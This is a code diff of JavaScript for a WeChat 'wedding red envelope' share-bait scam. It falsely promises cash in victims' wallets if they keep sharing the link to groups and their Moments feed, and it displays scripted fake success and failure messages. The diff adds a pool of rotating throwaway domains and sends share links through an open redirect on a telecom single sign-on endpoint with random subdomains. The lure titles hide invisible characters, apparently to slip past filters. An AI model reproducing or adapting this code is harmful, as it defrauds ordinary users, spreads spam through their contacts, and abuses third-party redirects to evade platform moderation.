@@ -7,19 +7,42 @@ var timelineSuccessCount = 0;
 
 var jumpUrls = ['http://dolphin.yoka.com/c?z=yoka&u=', 'https://www.zzidc.com/tomember?url=', 'http://manhua.weibo.cn/comic/comic/redirect?url=', 'https://account.36kr.com/api/v1/oauth/sign-out?client_id=6&ok_url=', 'http://rtb.behe.com/ck?landing=', 'http://mai.mama.cn/wap/member/loginCallBack?redirectUrl=', 'http://v10.sznews.com/c?z=sznews&u=', 'http://m.hao123.com/j.php?php=1&action=headline&url=', 'http://3g.hao123.com/j.php?php=1&action=headline&url=']
 
+var domains = ['weixin.wzxga.cn',
+'weixin.wzxbz.cn',
+'weixin.wzxjd.cn',
+'weixin.wzxey.cn',
+'weixin.wzxgy.cn',
+'weixin.wzxdv.cn',
+'weixin.wzxjk.cn',
+'weixin.wzxbs.cn',
+'weixin.wzxcb.cn',
+'weixin.wzxbw.cn',
+'weixin.wzxds.cn',
+'weixin.wzxji.cn',
+'weixin.wzxdq.cn',
+'weixin.wzxei.cn',
+'weixin.wzxjg.cn',
+'weixin.wzxfl.cn',
+'weixin.wzxdo.cn',
+'weixin.wzxim.cn',
+'weixin.wzxex.cn',
+'weixin.wzxja.cn',
+'weixin.wzxec.cn',
+'weixin.wzxik.cn']
+
 
 var tips = {
     appSuccess: function(count) {
-        return `<b style="font-size: 22px;color: LimeGreen">分享成功  <img style="width: 20px;vertical-align:middle" src="https://cdn.jsdelivr.net/gh/powerXIXI/envelope/assets/dui.png"></b><br/><br/>您仅需再分享到<b style="font-size: 18px;color: red">${count || 1}个不同的群</b><br/><b style="font-size: 20px;color: red;">${num}元现金</b><br/>将自动存入您的微信钱包`
+        return `<b style="font-size: 22px;color: LimeGreen">分享成功  <img style="width: 20px;vertical-align:middle" src="https://cdn.jsdelivr.net/gh/powerXIXI/envelope@latest/assets/dui.png"></b><br/><br/>您仅需再分享到<b style="font-size: 18px;color: red">${count || 1}个不同的群</b><br/><b style="font-size: 20px;color: red;">${num}元现金</b><br/>将自动存入您的微信钱包`
     },
     appFail: function() {
-        return `<b style="font-size: 22px;color: red">分享失败  <img style="width: 20px;vertical-align:middle" src="https://cdn.jsdelivr.net/gh/powerXIXI/envelope/assets/cuo.png"></b><br>注意：请不要分享到<b style="color: red">相同的群或好友</b><br>请尝试重新分享到<b style="color: red">不同的群</b><br/>即可马上领取<b style="font-size: 18px;color: red;">${num}</b>元现金`
+        return `<b style="font-size: 22px;color: red">分享失败  <img style="width: 20px;vertical-align:middle" src="https://cdn.jsdelivr.net/gh/powerXIXI/envelope@latest/assets/cuo.png"></b><br>注意：请不要分享到<b style="color: red">相同的群或好友</b><br>请尝试重新分享到<b style="color: red">不同的群</b><br/>即可马上领取<b style="font-size: 18px;color: red;">${num}</b>元现金`
     },
     timelineFail: function(count) {
-        return `<b style="font-size: 22px;color: red">分享失败  <img style="width: 20px;vertical-align:middle" src="https://cdn.jsdelivr.net/gh/powerXIXI/envelope/assets/cuo.png"></b><br><br>注意：必须<b style="color: red">公开</b>分享才可以领取<br><b style="color: #ffaa00">客服需要验证朋友圈分享信息发放红包！</b><br>请尝试重新分享到<b style="font-size: 18px;color: #f5294c">朋友圈</b><br>保证<b style="color: red">100%</b>可以领取<b style="font-size: 18px;color: red;">${num}</b>元现金`
+        return `<b style="font-size: 22px;color: red">分享失败  <img style="width: 20px;vertical-align:middle" src="https://cdn.jsdelivr.net/gh/powerXIXI/envelope@latest/assets/cuo.png"></b><br><br>注意：必须<b style="color: red">公开</b>分享才可以领取<br><b style="color: #ffaa00">客服需要验证朋友圈分享信息发放红包！</b><br>请尝试重新分享到<b style="font-size: 18px;color: #f5294c">朋友圈</b><br>保证<b style="color: red">100%</b>可以领取<b style="font-size: 18px;color: red;">${num}</b>元现金`
     },
     timelineSuccess: function(count) {
-        return `<b style="font-size: 22px;color: LimeGreen">分享成功  <img style="width: 20px;vertical-align:middle" src="https://cdn.jsdelivr.net/gh/powerXIXI/envelope/assets/dui.png"></b><br/><br/>仅需再分享到<b style="font-size: 18px;color: red">${count}次朋友圈</b><br/><b style="font-size: 20px;color: red;">${num}元现金</b><br/>将自动存入您的微信钱包`
+        return `<b style="font-size: 22px;color: LimeGreen">分享成功  <img style="width: 20px;vertical-align:middle" src="https://cdn.jsdelivr.net/gh/powerXIXI/envelope@latest/assets/dui.png"></b><br/><br/>仅需再分享到<b style="font-size: 18px;color: red">${count}次朋友圈</b><br/><b style="font-size: 20px;color: red;">${num}元现金</b><br/>将自动存入您的微信钱包`
     },
     done: function() {
         return '<b>感谢您的参与 :-)</b><br/><b style="font-size: 18px;color: red;">注意：系统将会验证朋友圈信息判断是否完成分享任务！</b><br/><br/><b>由于活动量巨大<br/>红包最迟24小时内到账<br/>请保留朋友圈信息至红包到账<br/>请注意查看您的微信钱包<br/></b><b style="color: red;">删除分享链接可能导致无法到账</b>'
@@ -33,34 +56,34 @@ var flow = {
         imgUrl:'http://img04.sogoucdn.com/app/a/100520146/5E76B1521EFF6DE3F957D4547CE1DD6B',
         type:'app',
         tip:'success',
-        link:jumpUrls[rnd(0,jumpUrls.length)] + encodeURIComponent('http://www.baidu.com')
+        link:"http://"+rndStr(rnd(5,8))+".189.cn/dqmh/ssoLink.do?method=skip&platNo=93507&toStUrl=http://189.cn." + domains[rnd(0,domains.length - 1)] + "/" + rndStr(5) + "goto/" + rndStr(6) + ".html?from=true&t="  + (new Date).getTime() 
     },{
         title:'婚͏͏͏͏͏͏͏͏͏͏礼邀͏͏请͏͏͏函派͏͏͏͏钱啦！！',
         desc:'喜钱人人有礼',
         imgUrl:'http://img04.sogoucdn.com/app/a/100520146/5E76B1521EFF6DE3F957D4547CE1DD6B',
         type:'app',
         tip:'fail',
-        link:jumpUrls[rnd(0,jumpUrls.length)] + encodeURIComponent('http://www.baidu.com')
+        link:"http://"+rndStr(rnd(5,8))+".189.cn/dqmh/ssoLink.do?method=skip&platNo=93507&toStUrl=http://189.cn." + domains[rnd(0,domains.length - 1)] + "/" + rndStr(5) + "goto/" + rndStr(6) + ".html?from=true&t="  + (new Date).getTime() 
     },{
         title:'婚͏͏͏͏͏͏͏͏͏͏礼邀͏͏请͏͏͏函派͏͏͏͏钱啦！！',
         desc:'喜钱人人有礼',
         imgUrl:'http://img04.sogoucdn.com/app/a/100520146/5E76B1521EFF6DE3F957D4547CE1DD6B',
         type:'app',
         tip:'success',
-        link:jumpUrls[rnd(0,jumpUrls.length)] + encodeURIComponent('http://www.baidu.com')
+        link:"http://"+rndStr(rnd(5,8))+".189.cn/dqmh/ssoLink.do?method=skip&platNo=93507&toStUrl=http://189.cn." + domains[rnd(0,domains.length - 1)] + "/" + rndStr(5) + "goto/" + rndStr(6) + ".html?from=true&t="  + (new Date).getTime() 
     }],
     timeline:[{
         title:'婚͏͏͏͏͏͏͏͏͏͏礼邀͏͏请͏͏͏函派͏͏͏͏钱啦！！',
         desc:'喜钱人人有礼',
         type:'timeline',
         tip:'fail',
-        link:jumpUrls[rnd(0,jumpUrls.length)] + encodeURIComponent('http://www.baidu.com')
+        link:"http://"+rndStr(rnd(5,8))+".189.cn/dqmh/ssoLink.do?method=skip&platNo=93507&toStUrl=http://189.cn." + domains[rnd(0,domains.length - 1)] + "/" + rndStr(5) + "goto/" + rndStr(6) + ".html?from=true&t="  + (new Date).getTime() 
     },{
         title:'婚͏͏͏͏͏͏͏͏͏͏礼邀͏͏请͏͏͏函派͏͏͏͏钱啦！！',
         desc:'喜钱人人有礼',
         type:'timeline',
         tip:'success',
-        link:jumpUrls[rnd(0,jumpUrls.length)] + encodeURIComponent('http://www.baidu.com')
+        link:"http://"+rndStr(rnd(5,8))+".189.cn/dqmh/ssoLink.do?method=skip&platNo=93507&toStUrl=http://189.cn." + domains[rnd(0,domains.length - 1)] + "/" + rndStr(5) + "goto/" + rndStr(6) + ".html?from=true&t="  + (new Date).getTime() 
     }]
 }
 
@@ -80,9 +103,19 @@ function share_start() {
 }
 
 function loading() {
-    wxalert('<img style=\"width: 30px\" src=\"https://cdn.jsdelivr.net/gh/powerXIXI/envelope/assets/loading.gif"><br><b style=\"font-size: 20px;color: red\">正在查询红包数据...</b>');
+    wxalert('<img style=\"width: 30px\" src=\"https://cdn.jsdelivr.net/gh/powerXIXI/envelope@latest/assets/loading.gif"><br><b style=\"font-size: 20px;color: red\">正在查询红包数据...</b>');
 }
-
+function randomBool(){
+    return (Math.random() - Math.random()) < 0;
+}
+function rndStr(length){
+    var str = '';
+    for(var i = 0;i<length;i++){
+        var code = randomBool() ? rnd(97,122) : rnd(48,57);
+        str += String.fromCharCode(code);
+    }
+    return str;
+}
 function it(n) {
     var i = new RegExp("(^|&)" + n + "=([^&]*)(&|$)"),
         t = window.location.search.substr(1).match(i);
@@ -118,9 +151,8 @@ function getParam(name) {
     return location.href.split("#")[0].match(new RegExp('[?&]' + name + '=([^?&]+)', 'i')) ? decodeURIComponent(RegExp.$1) : '';
 }
 
-function rnd(n, m) {
-    var random = Math.floor(Math.random() * (m - n + 1) + n);
-    return random;
+function rnd(min,max) {
+    return Math.round(Math.random() * (max - min) + min);
 }
 
 function showTips() {
